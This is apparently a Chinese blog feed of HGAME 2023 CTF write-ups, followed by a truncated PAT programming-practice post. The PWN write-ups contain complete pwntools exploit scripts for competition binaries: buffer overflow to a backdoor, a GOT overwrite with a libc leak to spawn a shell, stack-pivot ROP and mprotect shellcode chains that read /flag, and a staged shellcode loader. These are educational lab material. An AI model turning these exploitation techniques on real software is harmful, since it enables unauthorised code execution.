<p>一个播放起来是一个摩斯密码的wav文件</p>
<p>解法：</p>
<ol>
<li><p>提取出声音文件的信息：</p>
<pre><code class="bash">morse2ascii morse.wav
</code></pre>
<p><img src="/./../images/image-20230114103532078.png" alt="image-20230114103532078"></p>
</li>
<li><p>base64解码：</p>
</li>
</ol>
<p><img src="/./../images/image-20230114103642721.png" alt="image-20230114103642721"></p>
<p>篱笆一一&gt;栅栏密码；倒着一一&gt;逆序；密匙一一&gt;维吉尼亚密码;北欧神话一一&gt;vidar</p>
<p>（这里用morse2ascii计算出的数据多了一些下划线，做法是每一处下划线都去掉一个就行）</p>
<p>最后flag:</p>
<p><img src="/./../images/image-20230114104040525.png" alt="image-20230114104040525"></p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="easy-overflow"><a href="#easy-overflow" class="headerlink" title="easy_overflow"></a>easy_overflow</h3><p>他妈的，这道死活搞不出来，看了wp才知道是close函数关闭了标准输出通道。需要在来个报错输出，把结果输出过来</p>
<p>题目没啥好讲的，直接上exp</p>
<pre><code class="py">from pwn import *
io = process(&#39;./vuln&#39;)
# io = remote(&quot;week-1.hgame.lwsec.cn&quot;,31267)
elf = ELF(&#39;./vuln&#39;)
# main_addr = elf.sym[&#39;main&#39;]
back_addr = elf.sym[&#39;b4ckd0or&#39;]
payload = b&#39;A&#39;*16 + p64(0) + p64(back_addr)
io.sendline(payload)
io.interactive()
</code></pre>
<p>运用1&gt;&amp;2将结果从报错信息中输出</p>
<p><img src="/./../images/image-20230114110109416.png" alt="image-20230114110109416"></p>
<h3 id="choose-the-seat"><a href="#choose-the-seat" class="headerlink" title="choose_the_seat"></a>choose_the_seat</h3><p>**HINTS:**数组下标的检查好像少了点东西</p>
<p>下标v0没有检查下界</p>
<p><img src="/./../images/image-20230114151906912.png" alt="image-20230114151906912"></p>
<p>seats在bss段，并只有seats写入。无法进行栈操作<img src="/./../images/image-20230114152100537.png" alt="image-20230114152100537"></p>
<p>思路：运用负下标进行got表覆盖，用got表泄漏libc的地址</p>
<ol>
<li>先用vuln函数覆盖exit的地址，防止程序退出，方便下次再次利用</li>
<li>再用setbuf的plt表进行泄漏got地址，再用指定的libc计算基地址</li>
<li>用基地址计算system的地址，再用system的地址覆盖puts的地址，puts地址的旁边正好可以存放binsh的地方，连着binsh一起覆盖了</li>
</ol>
<p>exp：</p>
<pre><code class="py">from pwn import *

io = process(&#39;./vuln&#39;)
# io = remote(&#39;week-1.hgame.lwsec.cn&#39;,30536)
context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]
context.log_level = &#39;debug&#39;
def b():
    gdb.attach(io)
    pause()
elf = ELF(&quot;./vuln&quot;)
libc = ELF(&#39;./libc-2.31.so&#39;)
vuln_addr = elf.sym[&#39;vuln&#39;]

sys_libc = libc.sym[&#39;system&#39;]

libc_setbuf_addr = libc.sym[&#39;setbuf&#39;]
print(&#39;setbuf:&#39;,hex(libc_setbuf_addr))
io.sendlineafter(b&#39;one.&#39;,str(-6))
io.sendafter(b&#39;your name&#39;,p64(vuln_addr))
print(&quot;vuln&quot;,vuln_addr)
b()

io.sendlineafter(b&#39;one.&#39;,str(-8))
io.sendafter(b&#39;your name&#39;,b&#39;\xd0&#39;)

io.recvuntil(b&#39;name is &#39;)
setbuf_addr = u64(io.recvuntil(&#39;Your seat&#39;).split(b&#39;\nYour&#39;)[0].ljust(8,b&#39;\0&#39;))
print(&#39;addr:&#39;,hex(setbuf_addr))

base_addr = setbuf_addr - libc_setbuf_addr
sys_addr = base_addr + sys_libc

io.sendlineafter(b&#39;one.&#39;,str(-9))
payload = b&#39;/bin/sh\x00&#39; + p64(sys_addr)
io.sendafter(b&#39;your name&#39;,payload)
io.interactive()
</code></pre>
<p>这里在覆盖setbuf的地址时会写一个字母，字母所占位置不超过0x1000，因为一个内存页就是0x1000，所以无论基地址如何变，函数在内存页中的偏移地址不变，所以我们写一个字母也只是占用了偏移位置，对计算基地址并不会影响，所以我们查看指定libc中的setbuf（静态），将得到的setbuf的地址的偏移数值和我们泄漏出的偏移数值改成相同，再减去我们泄漏出的总值就能得到base_addr</p>
<p>下面把d0换成41就行，41就是我们写进去的’A’</p>
<p><img src="/./../images/image-20230114153844803.png" alt="image-20230114153844803"></p>
<p>如何这里减去总值：</p>
<p><img src="/./../images/image-20230114153925669.png" alt="image-20230114153925669"></p>
<p>这里还有一种做法就是写入\xd0,就是让地址不发生变化，这样计算基地址直接减去sym中找的地址就行，其实这种做法也就方便了一点点</p>
<pre><code class="py">io.sendafter(b&#39;your name&#39;,b&#39;\xd0&#39;)
io.recvuntil(b&#39;name is &#39;)
setbuf_addr = u64(io.recvuntil(&#39;Your seat&#39;).split(b&#39;\nYour&#39;)[0].ljust(8,b&#39;\0&#39;))
print(&#39;addr:&#39;,hex(setbuf_addr))
</code></pre>
<p>binsh的地址正好是下标0x10的整数倍，然后后面就是puts的地址，可以说出题人别有用心了</p>
<p><img src="/./../images/image-20230114153109502.png" alt="image-20230114153109502"></p>
<p>这里有两种做法，一种是从-9这个下标写入binsh的字符串和system的地址，让程序调用puts间接调用sytem函数</p>
<p>第二种做法就是用one_gadget查找libc中，执行binsh的指令</p>
<p><img src="/./../images/image-20230116195715458.png" alt="image-20230116195715458"></p>
<p>这里其实条件比较苛刻，要求一些寄存器中的地址对应的内容为null，这里存在偶然性，不过也是可以的</p>
<p>所以我们采用第一种方法</p>
<pre><code class="py">io.sendlineafter(b&#39;one.&#39;,str(-9))
payload = b&#39;/bin/sh\x00&#39; + p64(sys_addr)
io.sendafter(b&#39;your name&#39;,payload)
</code></pre>
<p>这里我们可以先打开tmux终端，在tmux运行exp，前提是exp设置了context.terminal &#x3D; [“tmux”,”splitw”,”-h”]，然后进行gdb.attch</p>
<p>这里方便起见我们可以设置一个调试函数，方便exp运行时临时调试程序</p>
<pre><code class="py">def b():
    gdb.attach(io)
    pause()
</code></pre>
<p>将这个函数放置到我们想调试的地方</p>
<p>效果：</p>
<p><img src="/./../images/image-20230116200235063.png" alt="image-20230116200235063"></p>
<p>然后再gdb先后输入got一一&gt;p&#x2F;x *(地址),就可以查看某个got中的内容了</p>
<p><img src="/./../images/image-20230116200809156.png" alt="image-20230116200809156"></p>
<p><img src="/./../images/image-20230116200845999.png" alt="image-20230116200845999"></p>
<p>这里吐槽一下，其实gdb新版本可以直接看到got表的内容，我这个gdb已经是ubuntu20.02的最高版本了，我这个docker就不折腾了</p>
<p>（PIE全称是position-independent executable，中文解释为地址无关可执行文件，该技术是一个针对代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术，如果程序开启了PIE保护的话，在每次加载程序时都变换加载地址，从而不能通过ROPgadget等一些工具来帮助解题。解法：内存是以页载入机制，如果开启PIE保护的话，只能影响到单个内存页，一个内存页大小为0x1000，那么就意味着不管地址怎么变，某一条指令的后三位十六进制数的地址是始终不变的。因此我们可以通过覆盖地址的后几位来可以控制程序的流程）</p>
<p>结果：</p>
<p><img src="/./../images/image-20230116201152048.png" alt="image-20230116201152048"></p>
<h3 id="ORW"><a href="#ORW" class="headerlink" title="ORW"></a>ORW</h3><p><strong>CTF中这类PWN题目通常通过禁用execve系统调用添加沙箱，不能直接执行命令getshell，这时候需要通过调用open、read、write这样的函数打开flag，存到内存中，再输出</strong></p>
<p>将三个函数开头字母作为简称，也就是orw</p>
<p>可以通过<a href="https://github.com/david942j/seccomp-tools">seccomp-tools</a>来判断是否添加沙箱，以及查看沙箱的规则</p>
<pre><code class="bash">seccomp-tools dump ./pwn
</code></pre>
<p>像这样就是比较经典的只允许64位的read、write、open三个系统调用，其他的系统调用号都被禁止</p>
<p>这里需要用到栈迁移</p>
<p>栈迁移的本质就是控制rsp和rbp，将栈帧转移到我们想要的位置，这里需要执行两次leave;return。</p>
<p>leave&#x3D;mov rsp,rbp;pop rbp	所以第一次不能将rsp进行改变</p>
<p>第一次是将rbp转移，第二次是将rsp转移。</p>
<p>栈迁移条件：</p>
<ol>
<li>存在 <strong>leave ret</strong> 这类gadget指令</li>
<li>存在可执行shellcode的内存区域</li>
</ol>
<p>链接：<a href="https://www.cnblogs.com/max1z/p/15299000.html">栈迁移原理介绍与应用 - Max1z - 博客园 (cnblogs.com)</a></p>
<p>这里说明一下：open拿到的只是文件句柄，里面没有文件内容，要读文件内容还是要执行read，read的参数就要求文件句柄，read的功能就是将硬盘文件内容读到内存中的某一块缓冲区中，然后write负责将缓冲区中的内容写进屏幕中</p>
<p>题目中溢出长度为0x30,那注入地址为0x30&#x2F;0x8&#x3D;6,就6条显然不能构成rop链</p>
<p>进行栈迁移，由于我没做过栈迁移的题，这里详细写一下</p>
<p>第一次溢出，把rbp放到别的地方,然后泄漏puts的内存地址,rbp放到bss+0x200，这个地址其实是程序地址之外的空间了，所以拿来当作新栈对程序不产生影响</p>
<p><img src="/./../images/image-20230115211905558.png" alt="image-20230115211905558"></p>
<pre><code class="py">payload1 = b&#39;A&#39; * 0x100 + p64(bss+0x200)
payload1 += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)
</code></pre>
<p>计算基地址，算出orw三个函数的地址</p>
<pre><code class="py">success(&#39;puts:&#39;,hex(puts_addr))
base_addr = puts_addr - libc_puts
open_addr = libc.sym[&#39;open&#39;] + base_addr
read_addr = libc.sym[&#39;read&#39;] + base_addr
write_addr = libc.sym[&#39;write&#39;] + base_addr
</code></pre>
<p>第二次溢出，将rbp放置到新栈</p>
<p><img src="/./../images/image-20230115212222119.png" alt="image-20230115212222119"></p>
<pre><code class="py">payload = b&quot;a&quot; * 0x100
payload += p64(bss + 0x200)
payload += p64(vuln_addr + 0x0F)
io.send(payload)
</code></pre>
<p>执行完第二次溢出后，rsp在旧栈位置，rbp在新栈位置，为了让rbp在新栈位置不发生移动，这里我们直接将之后的函数直接定位到read函数上，+0xf，因为read函数之前有对rbp和rsp进行操作</p>
<p>第三次溢出，将进行两次leave；ret，这样rsp就将锁定在新栈的栈顶位置，因为ret主要是靠rsp来控制程序流，rbp只是拿来定位局部变量</p>
<pre><code class="py">payload2 = b&#39;/flag\x00\x00\x00&#39;
payload2 += p64(pop_rdi_ret)
payload2 += p64(0x404160) #这里就是新rbp-0x100的地方，也就是刚写&#39;/flag\x00\x00\x00&#39;的地址
payload2 += p64(pop_rsi_ret)
payload2 += p64(0)
payload2 += p64(open_addr)

payload2 += p64(pop_rdi_ret)
payload2 += p64(0x3) 
payload2 += p64(pop_rsi_ret)
payload2 += p64(0x404711)   # 可能是指定缓冲区地址
payload2 += p64(pop_rdx_ret)
payload2 += p64(0x100)
payload2 += p64(read_addr)

payload2 += p64(pop_rdi_ret)
payload2 += p64(0x1)
payload2 += p64(pop_rsi_ret)
payload2 += p64(0x404711)
payload2 += p64(pop_rdx_ret)
payload2 += p64(0x100)
payload2 += p64(write_addr)

payload2 = payload2.ljust(0x100,b&#39;a&#39;)
payload2 += p64(0x404160)   # 这里就是第一次pop rbp后rbp的位置，第二次pop要往我们想要的栈顶走，把rsp移过去
payload2 += p64(leave_ret_addr)
</code></pre>
<p>所以第三次的rbp最终位置不用去管它，rbp的任务就是让rsp锁定到新栈栈顶位置就行</p>
<p>这里read和write都需要三个参数，64位，函数从左到右寄存器分别是rdi,rsi,rdx</p>
<p>通过pop ret指令来控制rsp从而控制程序流</p>
<p>以上就是栈迁移的详细内容</p>
<p>完整代码：</p>
<pre><code class="py">from pwn import *

# io = process(&#39;./vuln&#39;)
io = remote(&#39;week-1.hgame.lwsec.cn&#39;,31266)
elf = ELF(&#39;./vuln&#39;)
libc = ELF(&#39;libc-2.31.so&#39;)
context.log_level = &quot;debug&quot;
context.terminal =  [&quot;konsole&quot;, &quot;-e&quot;]

vuln_addr = elf.sym[&#39;vuln&#39;]
libc_puts = libc.sym[&#39;puts&#39;]
puts_got = elf.got[&#39;puts&#39;]
puts_plt = elf.plt[&#39;puts&#39;]

leave_ret_addr = 0x4012be
pop_rdi_ret = 0x0401393
bss = 0x404060



# 第一次溢出，把rbp放到别的地方,然后泄漏puts的内存地址
payload1 = b&#39;A&#39; * 0x100 + p64(bss+0x200)
payload1 += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)

io.sendafter(&#39;task.\n&#39;,payload1)
puts_addr = u64(io.recvline().split(b&#39;\n&#39;)[0].ljust(8,b&#39;\0&#39;))
success(&#39;puts:&#39;,hex(puts_addr))
base_addr = puts_addr - libc_puts
open_addr = libc.sym[&#39;open&#39;] + base_addr
read_addr = libc.sym[&#39;read&#39;] + base_addr
write_addr = libc.sym[&#39;write&#39;] + base_addr
pop_rsi_ret = 0x02601f + base_addr
pop_rdx_ret = 0x142c92 + base_addr

payload = b&quot;a&quot; * 0x100
payload += p64(bss + 0x200)
payload += p64(vuln_addr + 0x0F)
io.send(payload)


# 第二次溢出，将rbp放到二次写入的开始处，将rsp放到与rbp相同位置

payload2 = b&#39;/flag\x00\x00\x00&#39;
payload2 += p64(pop_rdi_ret)
payload2 += p64(0x404160) #这里就是新rbp-0x100的地方，也就是刚写&#39;/flag\x00\x00\x00&#39;的地址
payload2 += p64(pop_rsi_ret)
payload2 += p64(0)
payload2 += p64(open_addr)

payload2 += p64(pop_rdi_ret)
payload2 += p64(0x3) 
payload2 += p64(pop_rsi_ret)
payload2 += p64(0x404711)   # 指定缓冲区地址,随意
payload2 += p64(pop_rdx_ret)
payload2 += p64(0x100)
payload2 += p64(read_addr)

payload2 += p64(pop_rdi_ret)
payload2 += p64(0x1)
payload2 += p64(pop_rsi_ret)
payload2 += p64(0x404711)
payload2 += p64(pop_rdx_ret)
payload2 += p64(0x100)
payload2 += p64(write_addr)

payload2 = payload2.ljust(0x100,b&#39;a&#39;)
payload2 += p64(0x404160)   # 这里就是第一次pop rbp后rbp的位置，第二次pop要往我们想要的栈顶走，把rsp移过去
payload2 += p64(leave_ret_addr)


# gdb.attach(io)
io.send(payload2)
io.interactive()
</code></pre>
<p>最后结果：</p>
<p><img src="/./../images/image-20230115214426688.png" alt="image-20230115214426688"></p>
<p>这里还有一种做法，原本程序开启了NX保护，我们可以通过libc中的mprotect函数给一段内存区域更改权限，然后在栈中写入shellcode，然后让程序执行栈中的shellcode，这里shellcode也很长，也需要用到栈迁移</p>
<pre><code class="py">payload2 = p64(0)   #0x404160
payload2 += p64(pop_rdi_ret)
payload2 += p64(0x404000) #这里是mprotect函数要操作的开始地址   #0x404170
payload2 += p64(pop_rsi_ret)
payload2 += p64(0x1000)          # 要操作的大小 #0x404180
payload2 += p64(pop_rdx_ret)
payload2 += p64(7)  # 7代表可读可写可执行权限   #0x404190
payload2 += p64(mprotect_addr)
payload2 += p64(0x4041a8)       #0x4041a0
payload2 += asm(shellcraft.open(&quot;/flag&quot;,1))   
payload2 += asm(shellcraft.read(3,0x404500,100))
payload2 += asm(shellcraft.write(1,0x404500,100))

payload2 = payload2.ljust(0x100,b&#39;a&#39;)
payload2 += p64(0x404160)   # 这里就是第一次pop rbp后rbp的位置，第二次pop要往我们想要的栈顶走，把rsp移过去
payload2 += p64(leave_ret_addr)
</code></pre>
<p>mprotect参数有三，起始地址，长度，权限</p>
<p>这里程序出了bug，flag中g实在写不进去不知道为啥(更新，没设置64位，加上context.arch &#x3D; “amd64”这句就行，因为系统默认32位，&#x2F;flag的字符串正好超出4字节数据)</p>
<p>完整代码：</p>
<pre><code class="py">from pwn import *

# io = process(&#39;./vuln&#39;)
io = remote(&#39;week-1.hgame.lwsec.cn&#39;,31266)
elf = ELF(&#39;./vuln&#39;)
libc = ELF(&#39;libc-2.31.so&#39;)
# context.log_level = &quot;debug&quot;
# context.terminal =  [&quot;konsole&quot;, &quot;-e&quot;]
context.arch = &quot;amd64&quot;

vuln_addr = elf.sym[&#39;vuln&#39;]
libc_puts = libc.sym[&#39;puts&#39;]
puts_got = elf.got[&#39;puts&#39;]
puts_plt = elf.plt[&#39;puts&#39;]

leave_ret_addr = 0x4012be
pop_rdi_ret = 0x0401393
bss = 0x404060

# 第一次溢出，把rbp放到别的地方,然后泄漏puts的内存地址
payload1 = b&#39;A&#39; * 0x100 + p64(bss+0x200)
payload1 += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)

io.sendafter(&#39;task.\n&#39;,payload1)
puts_addr = u64(io.recv(6).ljust(8,b&#39;\0&#39;))
success(&#39;puts:&#39;,hex(puts_addr))
base_addr = puts_addr - libc_puts
mprotect_addr = libc.sym[&#39;mprotect&#39;] + base_addr
pop_rsi_ret = 0x02601f + base_addr
pop_rdx_ret = 0x142c92 + base_addr

payload = b&quot;a&quot; * 0x100
payload += p64(bss + 0x200)
payload += p64(vuln_addr + 0x0F)
io.send(payload)


# 第二次溢出，将rbp放到二次写入的开始处，将rsp放到与rbp相同位置

payload2 = p64(0)   #0x404160
payload2 += p64(pop_rdi_ret)
payload2 += p64(0x404000) #这里是mprotect函数要操作的开始地址   #0x404170
payload2 += p64(pop_rsi_ret)
payload2 += p64(0x1000)          # 要操作的大小 #0x404180
payload2 += p64(pop_rdx_ret)
payload2 += p64(7)  # 7代表可读可写可执行权限   #0x404190
payload2 += p64(mprotect_addr)
payload2 += p64(0x4041a8)       #0x4041a0
payload2 += asm(shellcraft.open(&quot;/flag&quot;,1))   
payload2 += asm(shellcraft.read(3,0x404500,100))
payload2 += asm(shellcraft.write(1,0x404500,100))

payload2 = payload2.ljust(0x100,b&#39;a&#39;)
payload2 += p64(0x404160)   # 这里就是第一次pop rbp后rbp的位置，第二次pop要往我们想要的栈顶走，把rsp移过去
payload2 += p64(leave_ret_addr)

# gdb.attach(io)
io.send(payload2)
io.interactive()
</code></pre>
<h3 id="simple-shellcode"><a href="#simple-shellcode" class="headerlink" title="simple_shellcode"></a>simple_shellcode</h3><p>题目：</p>
<pre><code class="c">int __cdecl main(int argc, const char **argv, const char **envp)
&#123;
  init(argc, argv, envp);
  mmap((void *)0xCAFE0000LL, 0x1000uLL, 7, 33, -1, 0LL);
  puts(&quot;Please input your shellcode:&quot;);
  read(0, (void *)0xCAFE0000LL, 0x10uLL);
  sandbox();
  MEMORY[0xCAFE0000]();
  return 0;
&#125;
</code></pre>
<p>题目用mmap映射出一段以0xCAFE0000开始，长度为0x1000，权限是7（可读可写可执行）</p>
<p>用sandbox设置了系统权限</p>
<p>这里向0xCAFE0000读入16字节，可以考虑rop，但检查保护时，就放弃了</p>
<p><img src="/./../images/image-20230116111016050.png" alt="image-20230116111016050"></p>
<p>写入shellcode,用orw的话，长度也远远不够</p>
<p>HINTS:</p>
<p>一次read不够多，为什么不再读一次呢？</p>
<p>第一次将read的shellcode读入，然后再程序执行0xCAFE0000这段内存，从而执行读入的read，那就要好好设计一波read的shellcode了，起初我是用rdi这种64位的寄存器写的，但是最终长度远远超过16字节</p>
<pre><code class="py">shellcode = asm(&quot;&quot;&quot;
mov rax,0
mov rsi,0xCAFE0010
mov rdi,0
mov rdx,0x1000
syscall
&quot;&quot;&quot;)
</code></pre>
<p><img src="/./../images/image-20230116111442132.png" alt="image-20230116111442132"></p>
<p>然后只能全部改成edi这种32位寄存器的形式了</p>
<pre><code class="py">shellcode = asm(&quot;&quot;&quot;
mov eax,0
mov esi,0xCAFE0010
mov edi,0
mov edx,0x1000
syscall
&quot;&quot;&quot;)
</code></pre>
<p>但是还是不行</p>
<p><img src="/./../images/image-20230116111621791.png" alt="image-20230116111621791"></p>
<p>把mov 0的操作全部换成xor，就对了</p>
<pre><code class="py">shellcode = asm(&quot;&quot;&quot;
xor eax,eax
mov esi,0xCAFE0010
xor edi,edi
mov edx,0x1000
syscall
&quot;&quot;&quot;)
</code></pre>
<p><img src="/./../images/image-20230116112543060.png" alt="image-20230116112543060"></p>
<p>这里要调用read，就要涉及系统调用号：</p>
<p>在汇编程序中使用Linux系统调用。 您需要采取以下步骤在程序中使用Linux系统调用 </p>
<ul>
<li>将系统调用号放在EAX寄存器中。</li>
<li>结果通常在EAX寄存器中返回</li>
</ul>
<p>&#x3D;&#x3D;这里注意64位和32的系统调用号是不一样的&#x3D;&#x3D;</p>
<ul>
<li>32位：<ul>
<li>传参方式：首先将系统调用号 传入 eax，sysread 的调用号 为 3 syswrite 的调用号 为 4</li>
</ul>
<p>	</p>
</li>
<li>64位：<ul>
<li>传参方式：首先将系统调用号 传入 rax，sysread 的调用号 为 0 syswrite 的调用号 为 1</li>
</ul>
</li>
</ul>
<p>所以这里的read系统调用号是0</p>
<p>这里写入read的shellcode后，执行我们写的shellcode，第二次写入的orw也是shellcode，这里要设置amd64位不然就无了。</p>
<p>这里有个细节在执行syscall指令时，程序会按照普通程序一样，会将shellcode的下一条指令压栈，所以在执行完syscall后，下一个指令要执行的地方就是syscall后的地址，这里除syscall这一条指令，长度为14，所以第二次写入的地址，只能是0xCAFE0000+14之后的地址，这里我们选择为0xCAFE0010就够了，然后直接写入orw的shellcode。</p>
<pre><code class="py">payload = asm(shellcraft.open(&#39;/flag&#39;))
payload += asm(shellcraft.read(3,0xcafe0500,0x100))
payload += asm(shellcraft.write(1,0xcafe0500,0x100))
</code></pre>
<p>这里的缓冲区我原先是写0xcafe1000的，结果后面才发现它总共才申请了0x1000的大小内存，哈哈</p>
<p>完整代码:</p>
<pre><code class="py">from pwn import *
io = remote(&#39;week-1.hgame.lwsec.cn&#39;,30105)

# context.log_level = &quot;debug&quot;
context.arch = &quot;amd64&quot;

shellcode = asm(&quot;&quot;&quot;
xor eax,eax
mov esi,0xCAFE0010
xor edi,edi
mov edx,0x1000
syscall
&quot;&quot;&quot;)
print(&#39;len:&#39;,len(shellcode))
io.sendafter(&#39;shellcode:\n&#39;,shellcode)

# payload = b&#39;\x90&#39; * 0x10
payload = asm(shellcraft.open(&#39;/flag&#39;))
payload += asm(shellcraft.read(3,0xcafe0500,0x100))
payload += asm(shellcraft.write(1,0xcafe0500,0x100))

io.send(payload)
io.interactive()
</code></pre>
<p>结果：</p>
<p><img src="/./../images/image-20230116113635529.png" alt="image-20230116113635529"></p>
<hr>
<h1 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h1><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="before-main"><a href="#before-main" class="headerlink" title="before_main"></a>before_main</h3><p>题中 __attribute__属性修饰函数，参考链接：<a href="https://blog.csdn.net/xiao__1bai/article/details/124156235">(61条消息) 浅析逆向中 gcc 在主函数前后运行的函数_沐一 · 林的博客-CSDN博客_逆向 init</a></p>
<p>该题考查base64，换表函数定义了__ attribute__ ((constructor))会使函数在 main() 函数之前被执行</p>
<p>这里ptrace检测反调试，即出现反调试就不进行换表操作<img src="/./../images/image-20230214103452756.png" alt="image-20230214103452756"></p>
<p>自己手动换表后用cyberchef解base64即可</p>
<hr>
<h1 id="Week3"><a href="#Week3" class="headerlink" title="Week3"></a>Week3</h1><h2 id="re-1"><a href="#re-1" class="headerlink" title="re"></a>re</h2>]]></content>
      <categories>
        <category>ctf</category>
        <category>赛题复现wp</category>
      </categories>
  </entry>
  <entry>
    <title>pat乙级第二天记录</title>
    <url>/2023/05/08/pat%E4%B9%99%E7%BA%A7%E7%AC%AC%E4%BA%8C%E5%A4%A9%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>记录一些写代码上的小细节</p>
<span id="more"></span>

<h2 id="题目一"><a href="#题目一" class="headerlink" title="题目一"></a>题目一</h2><p>读入 <em>n</em>（&gt;0）名学生的姓名、学号、成绩，分别输出成绩最高和成绩最低学生的姓名和学号。</p>
<h3 id="输入格式："><a href="#输入格式：" class="headerlink" title="输入格式："></a>输入格式：</h3><p>每个测试输入包含 1 个测试用例，格式为</p>
<pre><code>第 1 行：正整数 n
第 2 行：第 1 个学生的姓名 学号 成绩
第 3 行：第 2 个学生的姓名 学号 成绩
  ... ... ...
第 n+1 行：第 n 个学生的姓名 学号 成绩
</code></pre>
<p>其中<code>姓名</code>和<code>学号</code>均为不超过 10 个字符的字符串，成绩为 0 到 100 之间的一个整数，这里保证在一组测试用例中没有两个学生的成绩是相同的。</p>
<h3 id="输出格式："><a href="#输出格式：" class="headerlink" title="输出格式："></a>输出格式：</h3><p>对每个测试用例输出 2 行，第 1 行是成绩最高学生的姓名和学号，第 2 行是成绩最低学生的姓名和学号，字符串间有 1 空格。</p>
<h3 id="输入样例："><a href="#输入样例：" class="headerlink" title="输入样例："></a>输入样例：</h3><pre><code class="in">3
Joe Math990112 89
Mike CS991301 100
Mary EE990830 95
</code></pre>
<h3 id="输出样例："><a href="#输出样例：" class="headerlink" title="输出样例："></a>输出样例：</h3><pre><code class="out">Mike CS991301
Joe Math990112
</code></pre>
<p>这一题我其实想将学生信息用三个字符串来同时存各种信息，奈何c++切割字符串方面并没有python方便，所以我也老老实实空间换时间了，不过程序逻辑还真算是简单了</p>
<pre><code class="c++">#include&lt;iostream&gt;
using namespace std;
int main(void)&#123;
    int n,max_s = -1,min_s = 101,score;
    string max_name,min_name,max_num,min_num,tmp_name,tmp_num;
    cin &gt;&gt; n;
    for(int i=0;i&lt;n;i++)&#123;
        cin &gt;&gt; tmp_name &gt;&gt; tmp_num &gt;&gt; score;
        if(score &gt; max_s)&#123; max_s = score; max_name = tmp_name; max_num = tmp_num;&#125;
        if(score &lt; min_s)&#123; min_s = score; min_name = tmp_name; min_num = tmp_num;&#125;
    &#125;
    cout &lt;&lt; max_name &lt;&lt; &quot; &quot; &lt;&lt; max_num &lt;&lt; endl;
    cout &lt;&lt; min_name &lt;&lt; &quot; &quot; &lt;&lt; min_num;
    
&#125;
</code></pre>
<h2 id="题目二"><a href="#题目二" class="headerlink" title="题目二"></a>题目二</h2><p>卡拉兹(Callatz)猜想：</p>
<p>对任何一个正整数 <em>n</em>，如果它是偶数，那么把它砍掉一半；如果它是奇数，那么把 (3<em>n</em>+1) 砍掉一半。这样一直反复砍下去，最后一定在某一步得到 <em>n</em>&#x3D;1。卡拉兹在 1950 年的世界数学家大会上公布了这个猜想，传说当时耶鲁大学师生齐动员，拼命想证明这个貌似很傻很天真的命题，结果闹得学生们无心学业，一心只证 (3<em>n</em>+1)，以至于有人说这是一个阴谋，卡拉兹是在蓄意延缓美国数学界教学与科研的进展……</p>
<p>我们今天的题目不是证明卡拉兹猜想，而是对给定的任一不超过 1000 的正整数 <em>n</em>，简单地数一下，需要多少步（砍几下）才能得到 <em>n</em>&#x3D;1？</p>
<h3 id="输入格式：-1"><a href="#输入格式：-1" class="headerlink" title="输入格式："></a>输入格式：</h3><p>每个测试输入包含 1 个测试用例，即给出正整数 <em>n</em> 的值。</p>
<h3 id="输出格式：-1"><a href="#输出格式：-1" class="headerlink" title="输出格式："></a>输出格式：</h3><p>输出从 <em>n</em> 计算到 1 需要的步数。</p>
<h3 id="输入样例：-1"><a href="#输入样例：-1" class="headerlink" title="输入样例："></a>输入样例：</h3><pre><code class="in">3
</code></pre>
<h3 id="输出样例：-1"><a href="#输出样例：-1" class="headerlink" title="输出样例："></a>输出样例：</h3><pre><code class="out">5
</code></pre>
<p>我原本是这样写的：</p>
<pre><code class="c++">#include&lt;iostream&gt;
using namespace std;

int main()&#123;
    int n,i = 0;
    cin &gt;&gt; n;
    for(;n != 1;i++)&#123;
        if(n%2) n = (3*n + 1)/2;
         else n /= 2;	
    &#125;
    cout &lt;&lt; i;
&#125; 
</code></pre>
<p>但其实这在效率上差了点，if的两两种情况都要除2。</p>
<p>看了柳神的解答，我们可以将两种处理运算中抽离共同运算</p>
<pre><code class="c++">#include&lt;iostream&gt;
using namespace std;

int main()&#123;
    int n,i = 0;
    cin &gt;&gt; n;
    for(;n != 1;i++)&#123;
        if(n%2) n = (3*n + 1);
        n /= 2;	
    &#125;
    cout &lt;&lt; i;
&#125; 
</code></pre>
<p>像这题题解也一样</p>
<pre><code class="c++">for(int i=0;i&lt;tmp.size();i++)&#123;
        if(i!=0) cout &lt;&lt; &quot; &quot;;
        cout &lt;&lt; mp[tmp[i]-48];
    &#125;
</code></pre>
<p>每一次都不一样要打印空格，但每次必须要打印数字。可以在开端或者末尾进行受限。但是在末尾的话还要再次计算tmp.size()，这样就要花销了</p>
<h2 id="题目三"><a href="#题目三" class="headerlink" title="题目三"></a>题目三</h2><p>卡拉兹(Callatz)猜想已经在1001中给出了描述。在这个题目里，情况稍微有些复杂。</p>
<p>当我们验证卡拉兹猜想的时候，为了避免重复计算，可以记录下递推过程中遇到的每一个数。例如对 <em>n</em>&#x3D;3 进行验证的时候，我们需要计算 3、5、8、4、2、1，则当我们对 <em>n</em>&#x3D;5、8、4、2 进行验证的时候，就可以直接判定卡拉兹猜想的真伪，而不需要重复计算，因为这 4 个数已经在验证3的时候遇到过了，我们称 5、8、4、2 是被 3“覆盖”的数。我们称一个数列中的某个数 <em>n</em> 为“关键数”，如果 <em>n</em> 不能被数列中的其他数字所覆盖。</p>
<p>现在给定一系列待验证的数字，我们只需要验证其中的几个关键数，就可以不必再重复验证余下的数字。你的任务就是找出这些关键数字，并按从大到小的顺序输出它们。</p>
<h3 id="输入格式：-2"><a href="#输入格式：-2" class="headerlink" title="输入格式："></a>输入格式：</h3><p>每个测试输入包含 1 个测试用例，第 1 行给出一个正整数 <em>K</em> (&lt;100)，第 2 行给出 <em>K</em> 个互不相同的待验证的正整数 <em>n</em> (1&lt;<em>n</em>≤100)的值，数字间用空格隔开。</p>
<h3 id="输出格式：-2"><a href="#输出格式：-2" class="headerlink" title="输出格式："></a>输出格式：</h3><p>每个测试用例的输出占一行，按从大到小的顺序输出关键数字。数字间用 1 个空格隔开，但一行中最后一个数字后没有空格。</p>
<h3 id="输入样例：-2"><a href="#输入样例：-2" class="headerlink" title="输入样例："></a>输入样例：</h3><pre><code class="in">6
3 5 6 7 8 11
